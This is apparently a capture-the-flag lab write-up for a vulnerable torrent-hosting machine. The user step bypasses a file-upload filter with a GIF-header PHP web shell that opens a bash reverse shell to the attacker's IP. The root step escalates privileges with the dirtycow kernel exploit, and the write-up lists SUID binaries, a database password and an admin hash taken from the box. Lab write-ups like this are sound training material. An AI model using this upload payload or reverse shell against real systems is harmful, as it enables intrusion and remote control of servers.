User FLAG
-----

1. Nmap scan
2. Enumerate directories
3. Find upload page
4. Create a torrent file
5. Upload valid torrent file (use `torrent-creator`)
6. Modify screenshot to get a reverse shell (add gif headers)

```bash
POST /torrent/upload_file.php?mode=upload&id=ed6106425c8fd7635cf9160f1e7f7eb5ff1366d5 HTTP/1.1
```

```shell
------WebKitFormBoundaryBqdknE02TXAj3VxC
Content-Disposition: form-data; name="file"; filename="reverse.php"
Content-Type: image/gif

GIF87a;<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'");
?>

------WebKitFormBoundaryBqdknE02TXAj3VxC
Content-Disposition: form-data; name="submit"

Submit Screenshot
------WebKitFormBoundaryBqdknE02TXAj3VxC--
```

7. Get user flag

### Notes

Tried to use `exploit.py` in the scripts folder but for some reason I couldn't do a lateral movement once I got the reverse shell.

Thats why I decided to recreate it myself.

## Versions

OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
Apache/2.2.12 (Ubuntu)

### Wappalyzer

- Apache 2.2.12
- Prototype 1.4.0
- Ubuntu
- PHP 5.2.10
- Lightbox

## Info

In the search bar from the right, there is a SQL injection vulnerability.

## Links

- https://kimbatt.github.io/torrent-creator/
- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://github.com/jackybabes/Exploits/blob/main/Torrent_Hoster_2.0_RCE.py

Root FLAG
-----

1. Enumerate the system
2. List versions
3. Found vulnerable kernel
4. Compile dirtycow exploit
5. Run dirtycow exploit
6. Get root flag

## Binaries
/bin/ping6
/bin/ping
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mtr
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/arping
/usr/bin/gpasswd
/usr/bin/sudoedit
/usr/bin/at
/usr/sbin/pppd
/usr/sbin/uuidd

## Info
/var/www/torrent/config.php:    $dbpass         = $CFG->dbPassword;                                                                                                       
/var/www/torrent/config.php:    $dbuser         = $CFG->dbUserName;                                                                                                       
/var/www/torrent/config.php:  $CFG->dbPassword = "SuperSecret!!";       //db password                                                                                     
/var/www/torrent/config.php:  $CFG->dbUserName = "torrent";    //db username  

/usr/bin/gettext.sh                                                                                                                                                       
/usr/sbin/update-usbids.sh  

Admin d5bfedcee289e5e05b86daad8ee3e2e2  admin@yourdomain.com

## Links

- https://www.geeksforgeeks.org/how-to-find-out-file-types-in-linux/
- https://gitlab.com/exploit-database/exploitdb
- https://github.com/FireFart/dirtycow/blob/master/dirty.c